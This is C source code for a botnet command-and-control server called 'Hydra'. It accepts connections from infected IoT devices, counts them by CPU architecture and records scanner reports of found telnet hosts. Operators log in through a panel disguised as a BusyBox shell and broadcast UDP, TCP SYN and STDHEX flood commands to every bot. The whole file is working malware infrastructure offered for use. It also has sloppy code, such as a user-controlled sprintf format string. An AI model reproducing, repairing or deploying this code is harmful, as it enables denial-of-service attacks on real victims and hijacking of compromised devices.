#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <unistd.h>

#define MAXFDS 1000000
char usernamez[80];
struct login_info {
    char username[100];
    char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
    uint32_t ip;
    char x86;
    char mips;
    char mpsl;
    char arm;
    char spc;
    char ppc;
    char m68k;
    char sh4;
    char arc;
    char unk;
    char build[7];
    char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} XXXgements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
    int total = 0, got = 1;
    while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}

void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd) {
    int flags, s;
    flags = fcntl(sfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl(sfd, F_SETFL, flags);
    if (s == -1) {
        perror("fcntl");
        return -1;
    }
    return 0;
}

static int create_and_bind(char *port) {
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);
    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
        s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0) {
            break;
        }
        close(sfd);
    }
    if (rp == NULL) {
        fprintf(stderr, "Could not bind\n");
        return -1;
    }
    freeaddrinfo(result);
    return sfd;
}

void broadcast(char *msg, int us, char *sender) {
    int sendMGM = 1;
    if (strcmp(msg, "PING") == 0) sendMGM = 0;
    char *wot = malloc(strlen(msg) + 10);
    memset(wot, 0, strlen(msg) + 10);
    strcpy(wot, msg);
    trim(wot);
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    char *timestamp = asctime(timeinfo);
    trim(timestamp);
    int i;
    for (i = 0; i < MAXFDS; i++) {
        if (i == us || (!clients[i].connected)) continue;
        if (sendMGM && XXXgements[i].connected) {
            send(i, "\033[0m", 9, MSG_NOSIGNAL);
            send(i, sender, strlen(sender), MSG_NOSIGNAL);
            send(i, ": ", 2, MSG_NOSIGNAL);
        }
        send(i, msg, strlen(msg), MSG_NOSIGNAL);
        send(i, "\n", 1, MSG_NOSIGNAL);
    }
    free(wot);
}

void *BotEventLoop(void *useless) {
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    events = calloc(MAXFDS, sizeof event);
    while (1) {
        int n, i;
        n = epoll_wait(epollFD, events, MAXFDS, -1);
        for (i = 0; i < n; i++) {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
                clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].arm = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].unk = 0;
                close(events[i].data.fd);
                continue;
            } else if (listenFD == events[i].data.fd) {
                while (1) {
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;

                    in_len = sizeof in_addr;
                    infd = accept(listenFD, &in_addr, &in_len);
                    if (infd == -1) {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else {
                            perror("accept");
                            break;
                        }
                    }

                    clients[infd].ip = ((struct sockaddr_in *) &in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
                        if (!clients[ipIndex].connected || ipIndex == infd) continue;
                        if (clients[ipIndex].ip == clients[infd].ip) {
                            dup = 1;
                            break;
                        }
                    }
                    if (dup) {
                        if (send(infd, ". P\n", 13, MSG_NOSIGNAL) == -1) {
                            close(infd);
                            continue;
                        }
                        close(infd);
                        continue;
                    }
                    s = make_socket_non_blocking(infd);
                    if (s == -1) {
                        close(infd);
                        break;
                    }
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1) {
                        perror("epoll_ctl");
                        close(infd);
                        break;
                    }
                    clients[infd].connected = 1;
                }
                continue;
            } else {
                int iotfd = events[i].data.fd;
                struct clientdata_t *client = &(clients[iotfd]);
                int done = 0;
                client->connected = 1;
                client->arm = 0;
                client->mips = 0;
                client->mpsl = 0;
                client->x86 = 0;
                client->unk = 0;
                while (1) {
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);
                    while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, iotfd)) > 0) {
                        if (strstr(buf, "\n") == NULL) {
                            done = 1;
                            break;
                        }
                        trim(buf);
                        if (strcmp(buf, "PING") == 0) {
                            if (send(iotfd, "PONG\n", 5, MSG_NOSIGNAL) == -1) {
                                done = 1;
                                break;
                            }
                            continue;
                        }
                        if (strstr(buf, "REPORT ") == buf) {
                            char *line = strstr(buf, "REPORT ") + 7;
                            fprintf(telFD, "%s\n", line);
                            fflush(telFD);
                            TELFound++;
                            continue;
                        }
                        if (strstr(buf, "PROBING") == buf) {
                            char *line = strstr(buf, "PROBING");
                            scannerreport = 1;
                            continue;
                        }
                        if (strstr(buf, "REMOVING PROBE") == buf) {
                            char *line = strstr(buf, "REMOVING PROBE");
                            scannerreport = 0;
                            continue;
                        }
                        if (strstr(buf, "1") == buf) {
                            printf("\033[94mInfected Device - x86\n");
                            client->x86 = 1;
                        }
                        if (strstr(buf, "3") == buf) {
                            printf("\033[94mInfected Device - MIPS\n");
                            client->mips = 1;
                        }
                        if (strstr(buf, "4") == buf) {
                            printf("\033[94mInfected Device - MPSL\n");
                            client->mpsl = 1;
                        }
                        if (strstr(buf, "2") == buf) {
                            printf("\033[94mInfected Device - ARM\n");
                            client->arm = 1;
                        }
                        if (strstr(buf, "0") == buf) {
                            printf("\033[94mInfected Device - UNK\n");
                            client->unk = 1;
                        }
                        if (strcmp(buf, "PONG") == 0) {
                            continue;
                        }
                    }
                    if (count == -1) {
                        if (errno != EAGAIN) {
                            done = 1;
                        }
                        break;
                    } else if (count == 0) {
                        done = 1;
                        break;
                    }
                    if (done) {
                        client->connected = 0;
                        client->arm = 0;
                        client->mips = 0;
                        client->mpsl = 0;
                        client->x86 = 0;
                        client->unk = 0;
                        close(iotfd);
                    }
                }
            }
        }
    }
}

unsigned int armConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm) continue;
        total++;
    }

    return total;
}

unsigned int mipsConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].mips) continue;
        total++;
    }

    return total;
}

unsigned int mpslConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].mpsl) continue;
        total++;
    }

    return total;
}

unsigned int x86Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].x86) continue;
        total++;
    }

    return total;
}

unsigned int unkConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].unk) continue;
        total++;
    }

    return total;
}

unsigned int BotsConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].connected) continue;
        total++;
    }
    return total;
}

int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line = 0;
    char temp[512];

    if ((fp = fopen("login.txt", "r")) == NULL) {
        return (-1);
    }
    while (fgets(temp, 512, fp) != NULL) {
        if ((strstr(temp, str)) != NULL) {
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if (fp)
        fclose(fp);
    if (find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
    int iotfd = (int) sock;
    int find_line;
    OperatorsConnected++;
    pthread_t title;
    char usernamez[80];
    char buf[2048];
    char *username;
    char *password;
    memset(buf, 0, sizeof buf);
    char botnet[2048];
    memset(botnet, 0, 2048);
    char botcount[2048];
    memset(botcount, 0, 2048);

    FILE *fp;
    int i = 0;
    int c;
    fp = fopen("login.txt", "r");
    while (!feof(fp)) {
        c = fgetc(fp);
        ++i;
    }
    int j = 0;
    rewind(fp);
    while (j != i - 1) {
        fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
        ++j;
    }

    char clearscreen[2048];
    memset(clearscreen, 0, 2048);
    sprintf(clearscreen, "\033[1A");
    char user[1000];
    char user1[1000];
    char user2[1000];

    sprintf(user, "\033[30m\033[2J\033[1;1H");
    sprintf(user1, "\033[0mBusyBox v1.20.1 (2018-04-03 15:04:53 CST) built-in shell (ash)\r\n");
    sprintf(user2, "\033[0m>\033[0m ");

    if (send(iotfd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, user1, strlen(user1), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, user2, strlen(user2), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, iotfd) < 1) goto end;
    trim(buf);
    char *nickstring;
    sprintf(accounts[find_line].username, buf);
    sprintf(usernamez, buf);
    nickstring = ("%s", buf);
    find_line = Find_Login(nickstring);
    if (strcmp(nickstring, accounts[find_line].username) == 0) {
        char password[1000];
        if (send(iotfd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\r\n\033[0m>\033[30m ", accounts[find_line].username);
        if (send(iotfd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;

        if (fdgets(buf, sizeof buf, iotfd) < 1) goto end;

        trim(buf);
        if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
    }
    void *TitleWriter(void *sock) {
        int iotfd = (int) sock;
        char string[2048];
        while (1) {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; IoT %d | User Connected: %s %c", '\033', BotsConnected(), usernamez, '\007');
            if (send(iotfd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
            sleep(2);
        }
    }
    failed:
    if (send(iotfd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
    goto end;
    
    Banner:
    pthread_create(&title, NULL, &TitleWriter, sock);
    char bannerretard[3000];
    char bannerretard1[3000];
    char bannerretard2[3000];
    char bannerretard3[3000];
    char bannerretard4[3000];
    char bannerretard5[3000];
    char bannerretard6[3000];
    char bannerretard7[3000];

    sprintf(bannerretard, "\033[37m\033[2J\033[1;1H");
    sprintf(bannerretard1, "\033[90m       		██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ \r\n");
    sprintf(bannerretard2, "\033[90m       		██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗\r\n");
    sprintf(bannerretard3, "\033[90m       		███████║ ╚████╔╝ ██║  ██║██████╔╝███████║\r\n");
    sprintf(bannerretard4, "\033[90m       		██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║\r\n");
    sprintf(bannerretard5, "\033[90m       		██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║\r\n");
    sprintf(bannerretard6, "\033[90m       		╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝\r\n");
    sprintf(bannerretard7, "\033[90m       		     \033[94m~\033[90mType Help For All Commands\033[94m~\r\n");
    

    if (send(iotfd, bannerretard, strlen(bannerretard), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, bannerretard1, strlen(bannerretard1), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, bannerretard2, strlen(bannerretard2), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, bannerretard3, strlen(bannerretard3), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, bannerretard4, strlen(bannerretard4), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, bannerretard5, strlen(bannerretard5), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, bannerretard6, strlen(bannerretard6), MSG_NOSIGNAL) == -1) goto end;
    if (send(iotfd, bannerretard7, strlen(bannerretard7), MSG_NOSIGNAL) == -1) goto end;
    while (1) {
        char input[1000];
        sprintf(input,"\033[94m%s\033[0m@\033[94mHydra\033[0m# ", usernamez);
        if (send(iotfd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        break;
    }
    XXXgements[iotfd].connected = 1;

    while (fdgets(buf, sizeof buf, iotfd) > 0) {
        if(strstr(buf, "help")) {
            char methods1[1000];
        	char methods2[1000];
        	char methods3[1000];
            sprintf(methods1,"\033[0m/ STDHEX IP PORT TIME\r\n");
        	sprintf(methods2,"\033[0m/ TCP IP PORT TIME 32 syn 0 10\r\n");
        	sprintf(methods3,"\033[0m/ UDP IP PORT TIME PS\r\n");
            if (send(iotfd, methods1, strlen(methods1), MSG_NOSIGNAL) == -1) goto end;
            if (send(iotfd, methods2, strlen(methods2), MSG_NOSIGNAL) == -1) goto end;
            if (send(iotfd, methods3, strlen(methods3), MSG_NOSIGNAL) == -1) goto end;
        }
        if(strstr(buf, "bots")) {
            char arm[128];
            char mips[128];
            char mpsl[128];
            char x86[128];
            char unk[128];
            sprintf(arm, "\033[0mArm ~> %d\r\n", armConnected());
            sprintf(mips,"\033[0mMips~> %d\r\n", mipsConnected());
            sprintf(mpsl,"\033[0mMpsl~> %d\r\n", mpslConnected());
            sprintf(x86, "\033[0mx86 ~> %d\r\n", x86Connected());
            sprintf(unk, "\033[0mArc ~> %d\r\n", unkConnected());
            if (send(iotfd, arm, strlen(arm), MSG_NOSIGNAL) == -1) goto end;
            if (send(iotfd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
            if (send(iotfd, mpsl, strlen(mpsl), MSG_NOSIGNAL) == -1) goto end;
            if (send(iotfd, x86, strlen(x86), MSG_NOSIGNAL) == -1) goto end;
            if (send(iotfd, unk, strlen(unk), MSG_NOSIGNAL) == -1) goto end;
        }
        if(strstr(buf, "cls")) {
            if (send(iotfd, bannerretard, strlen(bannerretard), MSG_NOSIGNAL) == -1) goto end;
    		if (send(iotfd, bannerretard1, strlen(bannerretard1), MSG_NOSIGNAL) == -1) goto end;
    		if (send(iotfd, bannerretard2, strlen(bannerretard2), MSG_NOSIGNAL) == -1) goto end;
    		if (send(iotfd, bannerretard3, strlen(bannerretard3), MSG_NOSIGNAL) == -1) goto end;
    		if (send(iotfd, bannerretard4, strlen(bannerretard4), MSG_NOSIGNAL) == -1) goto end;
    		if (send(iotfd, bannerretard5, strlen(bannerretard5), MSG_NOSIGNAL) == -1) goto end;
    		if (send(iotfd, bannerretard6, strlen(bannerretard6), MSG_NOSIGNAL) == -1) goto end;
    		if (send(iotfd, bannerretard7, strlen(bannerretard7), MSG_NOSIGNAL) == -1) goto end;
        }
        trim(buf);
        char input[1000];
        sprintf(input,"\033[94m%s\033[0m@\033[94mHydra\033[0m# ", usernamez);
        if (send(iotfd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        if (strlen(buf) == 0) continue;
        printf("%s: \"%s\"\n",accounts[find_line].username, buf);

        FILE *LogFile;
        LogFile = fopen("cmds.txt", "a");
        time_t now;
        struct tm *gmt;
        char formatted_gmt [50];
        char lcltime[50];
        now = time(NULL);
        gmt = gmtime(&now);
        strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
        fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
        fclose(LogFile);
        broadcast(buf, iotfd, accounts[find_line].username);
        memset(buf, 0, 2048);
    }

    end:
    XXXgements[iotfd].connected = 0;
    close(iotfd);
    OperatorsConnected--;
}

void *BotListener(int port) {
    int sockfd, newsockfd;
    socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd, 5);
    clilen = sizeof(cli_addr);
    while (1) {
        newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create(&thread, NULL, &BotWorker, (void *) newsockfd);
    }
}

int main(int argc, char *argv[], void *sock) {
    signal(SIGPIPE, SIG_IGN);
    int s, threads, port;
    struct epoll_event event;
    if (argc != 4) {
        fprintf(stderr, "Usage ~> ./%s <BOT-PORT> <THREADS> <CNC-PORT>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    port = atoi(argv[3]);
    threads = atoi(argv[2]);
    listenFD = create_and_bind(argv[1]);
    if (listenFD == -1) abort();
    s = make_socket_non_blocking(listenFD);
    if (s == -1) abort();
    s = listen(listenFD, SOMAXCONN);
    if (s == -1) {
        perror("listen");
        abort();
    }
    epollFD = epoll_create1(0);
    if (epollFD == -1) {
        perror("epoll_create");
        abort();
    }
    event.data.fd = listenFD;
    event.events = EPOLLIN | EPOLLET;
    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, listenFD, &event);
    if (s == -1) {
        perror("epoll_ctl");
        abort();
    }
    pthread_t thread[threads + 2];
    while (threads--) {
        pthread_create(&thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
    }
    pthread_create(&thread[0], NULL, &BotListener, port);
    while (1) {
        broadcast("PING", -1, "Hydrav2.0Lmao");
        sleep(60);
    }
    close(listenFD);
    return EXIT_SUCCESS;
}